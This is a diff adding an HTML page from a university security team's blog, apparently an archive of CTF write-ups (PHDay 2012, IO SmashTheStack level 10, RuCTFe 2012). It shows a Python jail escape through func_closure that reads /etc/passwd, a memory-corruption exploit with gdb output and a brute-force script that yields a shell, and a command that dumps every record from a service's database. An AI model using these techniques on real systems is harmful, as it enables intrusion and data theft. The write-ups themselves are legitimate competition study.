@@ -1,0 +1,811 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="PWN400是一个用python编写的应用，运行在服务端上。 首先用 eval(&#8220;a=&#8221; + raw_input()) 的形式做了一个jail让我们无法import其他包的东西 然后在Reader函数用一个@guard修饰器限制参数必须是字符串， &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/blog/page/7">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-pwn-400/">PHDay CTF 2012 Quals PWN 400</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>PWN400是一个用python编写的应用，运行在服务端上。</p>
+
+<p>首先用 eval(&#8220;a=&#8221; + raw_input()) 的形式做了一个jail让我们无法import其他包的东西</p>
+
+<p>然后在Reader函数用一个@guard修饰器限制参数必须是字符串，Reader函数内也要参数必须是那几个log文件的文件名之一。</p>
+
+<p>大体的样子是这样的：</p>
+
+<pre><code>def reader(open_file=open, XXXXXX不记得了):
+     @guard(filename=str)
+     def _Reader(filename):
+          XXXX不记得了
+     return _Reader
+Reader=reader()
+</code></pre>
+
+<p>然后在Reader函数定义完之后，在&#95;&#95;builtins&#95;&#95;里删除了open、eval、type等等的builtin函数。然后删除了&#95;&#95;builtins&#95;&#95;等危险的全局变量，然后从每一个object中删除了&#95;&#95;closures&#95;&#95;</p>
+
+<p>所以说如果你要用open，那没有。要用Reader读取其他文件不行。要import不行。</p>
+
+<p>这个问题的方案是，他删除了&#95;&#95;closures&#95;&#95;但没有删除func_closure</p>
+
+<p>Reader.func&#95;closure[0].cell&#95;contents.func&#95;closure[0].cell&#95;contents(&#8216;/etc/passwd&#8217;).read()</p>
+
+<p>用这个就可以了。</p>
+
+<p>func_closure[X]是一个cell到一个object，cell似乎就是python中用来记引用的东西。</p>
+
+<p>首先Reader是一个被修饰的函数，第一层闭包外面就是原来的Reader函数和修饰器的参数。</p>
+
+<p>原来的Reader函数再外面的闭包就有open_file=open这个东西，就是open函数，所以用来打开/etc/passwd读取就好了。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-misc200/">PHDay CTF 2012 Quals Misc200</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>此题题目为如下一张全黑的图片：<br/>
+<a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/square.gif"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/square-300x300.gif" alt="" title="square" width="300" height="300" class="alignnone size-medium wp-image-206" /></a></p>
+
+<p>很容易猜想到图片可能是背景颜色遮盖了图片内容，也有可能是图片的header等一些信息损坏，导致图片显示有问题。<br/>
+对于第一种猜想，用PS打开图片，就可以看到图片的各个像素点都是一样的颜色。<br/>
+对于第二种猜想，Mr.刘在学习gif的数据格式，校验每位是否错误，这种方法很费力费时。我采用的是，用Python读取图片像素，生成新的图片。</p>
+
+<p>代码如下：<br/>
+<a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/code1.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/code1-300x68.png" alt="" title="code" width="300" height="68" class="alignnone size-medium wp-image-213" /></a></p>
+
+<p>打开新生成图片，显示结果如下：<br/>
+<a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/new1.gif"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/new1-300x300.gif" alt="" title="new" width="300" height="300" class="alignnone size-medium wp-image-209" /></a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-f100/">PHDay CTF 2012 Quals F100</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>此题为图片隐藏信息提取题。图片如下，<br/>
+<a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/png-300x300." alt="" width="300" height="300" class="alignnone size-medium wp-image-186" /></a></p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/phday-ctf-2012-quals-f100/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-bin100%e6%80%9d%e8%b7%af/">PHDay CTF 2012 Quals BIN100思路</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-18T00:00:00+08:00" pubdate data-updated="true">Dec 18<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>进入实验室后，第二次参加CTF比赛，第一次做出题来，总算入门了，下面总结一下比赛心得，主要讲述一下我做题的思路，以供入门新手借鉴，总结经验，锻炼队伍。</p>
+
+<p>IDA打开binary后，习惯性的F5，可以看到一个很简单的main函数</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/main.jpg"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/main.jpg" alt="" width="492" height="227" class="aligncenter size-full wp-image-198" /></a></p>
+
+<p>这个main函数主要完成了三个功能：</p>
+
+<p>1.把“HoppaKey”字符串拷贝到一个0&#215;400长的缓冲区里，猜想其与Key有关，命名其为Flag；</p>
+
+<p>2.取参数0赋给全局变量，参数0自然是binary的全路径，那么可以将这个全局变量命名为pSelfPathName；</p>
+
+<p>3．将5个函数的地址赋给了5个全局变量，将5个函数命名为f1-f5，5个函数指针命名为pf1-pf5。</p>
+
+<p>然后main打印了错误字符串后就奇怪的结束了，那就根据这些简单的线索来进一步分析吧</p>
+
+<p><strong>第一线索：</strong></p>
+
+<p>既然我们怀疑Flag缓冲区与KEY有关，那么查看引用Flag的地方，发现只有main引用了Flag，</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/flag.jpg"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/flag.jpg" alt="" width="468" height="194" class="aligncenter size-full wp-image-196" /></a></p>
+
+<p><strong>第二线索：误入歧途，最复杂的代码不一定是KEY的藏身处</strong></p>
+
+<p>进行不下去，那么转向下一疑点pSelfPathName，查看引用pSelfPathName的地方，</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/path.jpg"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/path.jpg" alt="" width="454" height="134" class="aligncenter size-full wp-image-200" /></a></p>
+
+<p>发现f5引用了pSelfPathName，赶紧跳到f5函数去分析，</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/f5.jpg"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/f5.jpg" alt="" width="601" height="455" class="aligncenter size-full wp-image-195" /></a></p>
+
+<p>F5的代码好像干了点别的事，貌似很很有戏，其实这个时候已经中计了，最后证明这个函数对我们一点帮助都没有，其唯一功能就是误导我们。</p>
+
+<p>看这个函数的代码，它在自身binary中找到一个名叫load_me的资源，并把kernel32.dll中的LoadLibraryA，GetProcAddress两个函数的地址写了进去，然后改写了一堆内存，最后调用了偏移3376处的一个函数，</p>
+
+<p>越看越像那么回事，继续分析下去，用eXeScope打开binary，</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/load_me.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/load_me.png" alt="" width="658" height="317" class="aligncenter size-full wp-image-197" /></a></p>
+
+<p>找到名叫load_me的资源，用显眼的“MZ”一眼看出这个资源竟然是个未加密的PE文件，赶紧将其导出为loadme.exe，用IDA打开，跳到偏移3376的地方，虚拟地址为401930，F5函数</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/3376.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/3376.png" alt="" width="619" height="373" class="aligncenter size-full wp-image-193" /></a></p>
+
+<p>这个函数更乱，可能跟f5函数改写的内存有关。。。。。。</p>
+
+<p>双击执行试试，弹出了个框</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/dudu.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/dudu.png" alt="" width="185" height="158" class="aligncenter size-full wp-image-194" /></a></p>
+
+<p>It’s much easier dudu！！！被鄙视了，思路不对？</p>
+
+<p><strong>第三线索：</strong></p>
+
+<p>那回到main函数中的第三条线索，依次再浏览一下f1-f4，4个函数都干了些什么，发现都只是一些简单的数组运算，而且除了main以外没有任何其他地方引用了这4个函数的地址，很奇怪，这几个函数都没被调用，那他们到底是干嘛的呢？</p>
+
+<p><strong>柳暗花明：原来只是个填空题</strong></p>
+
+<p>这个时候陈钦同学过来说他注意到了好多nop指令，这一下提醒了我，刚开始也看到了main函数里的两串各6个字节的nop指令，没引起注意，现在回想，会不会是出题者故意将一些代码用nop覆盖呢？</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/nop.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/nop.png" alt="" width="587" height="403" class="aligncenter size-full wp-image-199" /></a></p>
+
+<p>6个字节正好是call dword ptr [mem]（FF 15 ADDR），原来就是个填空题？难道是从f1-f5中选择两个函数填到这两个地方？</p>
+
+<p>用OD加载binary，断在nop前面（40130A），在nop处写入汇编代码：call [00403378]（从pf1至pf5都试一遍）</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/pf1-5.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/pf1-5.png" alt="" width="440" height="81" class="aligncenter size-full wp-image-201" /></a></p>
+
+<p>结果都不能通过中间的两次判断，直接跳到wrong（打印错误信息的代码）去了，f5直接就弹出了一堆“计算器”窗口，应该可以忽略f5了。</p>
+
+<p>看看这两次判断要求什么条件：返回值al != 0 &amp;&amp; fLoadMe != 0。f1-f5谁影响了这两个标志？</p>
+
+<p>根据401309的代码可以看到这里把字符串“HoppaKey”作为参数压入了栈里。</p>
+
+<p>f1 8=>16 ret 0 8字节字符串 转换为 16字节字符串</p>
+
+<p>f2 32 ret 1 要求输入32字节字符串</p>
+
+<p>f3 16=>32 ret 0 or 1; fLoadMe = (int)f5; 16字节字符串 转换为 32字节字符串</p>
+
+<p>f4 >=8 ret 1 要求输入8字节以上字符串</p>
+
+<p>貌似只有f3最接近，但输入字符串只有8字节，不满足16字节要求，f3就会返回0</p>
+
+<p><strong>F5只是传说，不要迷恋5哥</strong></p>
+
+<p>这时陈钦同学再次发现f4里也有nop串，粗心的我竟然一路F5，没留意一眼汇编代码，原来还有更多的nop串，为了不错杀一个换人，直接搜索nop串，发现总共有4个nop串，其中main中2个，图已贴出，在f1，f4里还各有一个nop串，这个4个函数应该各就各位了，拿出OD试吧。。。。。。</p>
+
+<p>最终尝试出main中第1个nop串填充call f4，f4->f1，f1->f3，main中第2个nop串call f2。</p>
+
+<p>不断的尝试，走了很多弯路，最后总算大功告成。</p>
+
+<p><strong>希望咱们队伍以后多多交流，快快成长，早日杀进前十！！！</strong></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-pwn300/">PHDay CTF 2012 Quals PWN300</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>这题是基于twisted框架的一个web服务，题目给了一个web.py和process.pyc，阅读web.py代码发现处理post请求的核心函数在process模块中。使用unpyc这个工具反编译process.pyc，得到如下代码：</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/phday-ctf-2012-quals-pwn300/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-pwn200/">PHDay CTF 2012 Quals PWN200</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>这道题是一个远程的binary服务，提供了消息操作的接口，连上去会有如下提示：</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/phday-ctf-2012-quals-pwn200/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-misc400/">PHDay CTF 2012 Quals Misc400</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>这道题给了一个50x50x50的三维迷宫，让你求出从给定入口到给定出口之间的路径。</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/phday-ctf-2012-quals-misc400/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/phday-ctf-2012-quals-bin100/">PHDay CTF 2012 Quals BIN100</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>bin100为2进制分析题</p>
+
+</div>
+  
+  
+    <footer>
+      <a rel="full-article" href="/phday-ctf-2012-quals-bin100/">Read on &rarr;</a>
+    </footer>
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/io-smaththestack-level-10/">IO SmathTheStack Level 10</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-05T00:00:00+08:00" pubdate data-updated="true">Dec 5<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>IO SmathTheStack Level 10的程序代码如下：</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char **argv){
+        FILE *fp = fopen("/levels/level10_alt.pass", "r");
+        struct {char pass[20], msg_err[20]} pwfile = 0;
+        char ptr[0];
+
+        if(!fp || argc != 2)
+                return -1;
+
+        fread(pwfile.pass, 1, 20, fp);
+    pwfile.pass[19] = 0;
+        ptr[atoi(argv[1])] = 0;
+        fread(pwfile.msg_err, 1, 19, fp);
+        fclose(fp);
+
+        if(!strcmp(pwfile.pass, argv[1]))
+                execl("/bin/sh", "sh", 0);
+        else
+                puts(pwfile.msg_err);
+
+        return 0;
+}
+</code></pre>
+
+<p>阅读代码发现，输入的argv[1]被atoi函数转成整数，加到ptr这个栈上的指针上，然后在对应的字节上写入0，也就是说我们只能通过输入参数将进程内存空间中某一个字节置为0。</p>
+
+<p>一开始我一直在想办法绕过strcmp函数，进入execl拿到shell，百思不得其解；后来突然关注到了后面的else语句，想到可以利用puts语句来输出pwfile.pass，而这个可以通过重定位FILE对象*fp里面的文件读写指针来实现，因为写入字节0再第二次fread操作之前。</p>
+
+<p>于是自己在BT5上编译程序验证这个想法的可行性，带上-g参数带符号表进行gdb调试：</p>
+
+<pre><code>gcc -g level10.c -o level10
+</code></pre>
+
+<p>在第一个fread处设上断点，然后查看*fp结构，注意到这个FILE对象是分配在堆上的：</p>
+
+<pre><code>Breakpoint 1, 0x08048616 in main (argc=2, argv=0xbffff5d4) at level10.c:14
+14          fread(pwfile.pass, 1, 20, fp);
+(gdb) p *fp
+$1 = {_flags = -72539000, _IO_read_ptr = 0x0, _IO_read_end = 0x0, 
+  _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, 
+  _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, 
+  _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, 
+  _markers = 0x0, _chain = 0xb7fca580, _fileno = 5, _flags2 = 0, 
+  _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "", 
+  _lock = 0x804b0a0, _offset = -1, __pad1 = 0x0, __pad2 = 0x804b0ac, 
+  __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0, _mode = 0, 
+  _unused2 = '\000' &lt;repeats 39 times&gt;}
+</code></pre>
+
+<p>执行完第一次fread后再次查看*fp：</p>
+
+<pre><code>(gdb) ni
+15      pwfile.pass[19] = 0;
+(gdb) p *fp
+$2 = {_flags = -72539000, 
+  _IO_read_ptr = 0xb7fdf014, 
+  _IO_read_base = 0xb7fdf000, 
+  _IO_write_base = 0xb7fdf000, 
+  _IO_write_ptr = 0xb7fdf000, 
+  _IO_write_end = 0xb7fdf000, 
+  _IO_buf_base = 0xb7fdf000, 
+  _IO_buf_end = 0xb7fe0000 "d", _IO_save_base = 0x0, _IO_backup_base = 0x0, 
+  _IO_save_end = 0x0, _markers = 0x0, _chain = 0xb7fca580, _fileno = 5, 
+  _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\000', 
+  _shortbuf = "", _lock = 0x804b0a0, _offset = -1, __pad1 = 0x0, 
+  __pad2 = 0x804b0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0, _mode = -1, 
+  _unused2 = '\000' &lt;repeats 39 times&gt;}
+</code></pre>
+
+<p>这里注意到&#95;IO&#95;read&#95;ptr已经有了数值，相比较&#95;IO&#95;read&#95;base有了0&#215;14字节的偏移，因为第一次读取了0&#215;14字节。我们只需要将&#95;IO&#95;read&#95;ptr的最低一个字节覆盖为0，这样下一次fread就又从头开始读了。查看fp->&#95;IO&#95;read&#95;ptr所在地址和ptr地址：</p>
+
+<pre><code>(gdb) p &amp;fp-&gt;_IO_read_ptr
+$3 = (char **) 0x804b00c
+(gdb) p ptr
+$4 = 0xbffff4e4
+</code></pre>
+
+<p>可以使用gdb的set命令验证想法的正确性，继续执行会发现输出的确实是文件最开始的字符串：</p>
+
+<pre><code>(gdb) set fp-&gt;_IO_read_ptr=0xb7fdf000
+</code></pre>
+
+<p>现在如果我们要利用参数来覆盖&#95;IO&#95;read&#95;base的最低字节，只需要计算便宜&amp;fp->&#95;IO&#95;read&#95;ptr-ptr即可，在BT5中计算到0x804b00c-0xbffff4e4=1208269608，但是在远程的主机上这个数值肯定不同，而且由于关闭了ASLR，这个数值是固定的，因此我们可以对其附近的范围进行穷举，在/tmp目录中新建一个目录，写入如下python脚本：</p>
+
+<pre><code>#!/usr/bin/env python
+import subprocess
+import sys
+
+start = 1208270000
+end = 1208280000
+for i in range(start, end):
+  try:
+    output = subprocess.check_call(["/levels//level10", str(i)])
+  except Exception:
+    continue
+</code></pre>
+
+<p>很快就能穷举完，在一堆ACCESS DENIED&#8230;之中你会发现一个key，拿到这个key之后再作为参数传入level10中运行即可得到euid为level10的shell。值得注意的是key中有两个感叹号，shell中默认代表上一条指令，因此需要加反斜杠&#8217;\&lsquo;进行转义。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/ructfe-2012-service-gds-writeup/">RuCTFe 2012 Service Gds Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-04T00:00:00+08:00" pubdate data-updated="true">Dec 4<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>gds is a service coded in C++ and Qt. You may get the binary and source code from <a href="http://ctftime.org/task/153/">http://ctftime.org/task/153/</a>.</p>
+
+<p>The program locates at /home/gds/service and listens at TCP port 2012, and it receives some commands after you log in. Initially you may log in using booking/booking. Obviously we should patch it.</p>
+
+<p>Keys are pushed into PNR database, which is located at /home/gds/pnrs.db. After some analysis of the binary under the help of IDA, we found a vulnerability that we could exploit. Simply type command *RT * after logging in, and you could retrive every single PNRs in database, including keys.</p>
+
+<p>Now as we have the source code (I&#8217;m not on the mail list, so I found the code snippet right before I write this writeup, shiiiiiit), the vulnerability is more than obvious. The command <em>RT * is first converted into a *GDSCommand</em> instance, with no parameters (m_params is empty). Here is the definition of <em>GDSCommand</em>.</p>
+
+<pre><code>class GDSCommand {
+public:
+    GDSCommand(const QByteArray&amp;);
+    virtual ~GDSCommand() {};
+    static QString help() { return "No help on subject"; }
+    QString getParam( int i );
+protected:
+    QStringList m_params;
+};
+</code></pre>
+
+<p>And let&#8217;s have a look at <em>GDSPnrDatabase::compareWithTemplate(const GDSPnr&amp; f, const GDSPnr&amp; templ)</em>:</p>
+
+<pre><code>bool GDSPnrDatabase::compareWithTemplate( const GDSPnr&amp; f, const GDSPnr&amp; templ )
+{
+    bool result = true;
+    result &amp;= ( templ.name.isEmpty() || f.name == templ.name );
+    result &amp;= ( templ.surname.isEmpty() || f.surname == templ.surname );
+    result &amp;= ( templ.passport.isEmpty() || f.passport == templ.passport );
+    result &amp;= ( templ.agent.isEmpty() || f.agent == templ.agent );
+    result &amp;= ( templ.uniqID.isEmpty() || f.uniqID == templ.uniqID );
+    return result;
+}
+</code></pre>
+
+<p>The argument <em>templ</em> contains the argument in our command <em>RT <unique ID></em>. The unique ID is retrived by <em>getParam(1);</em>, and <em>getParam()</em> is defined as follows:</p>
+
+<pre><code>QString GDSCommand::getParam( int i )
+{
+    return m_params.value(i);
+}
+</code></pre>
+
+<p>If <em>i</em> is out of bounds, then <a href="http://doc.qt.digia.com/qt/qlist.html#value">a default-constructed value is returned</a>. Well, that&#8217;s why we could retrieve every PNRs by typing *RT *, where no parameters are provided.</p>
+
+<p>BTW: We need a VPS in Korea or Russia for proxy next time.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/page/8/">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/blog/page/6/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
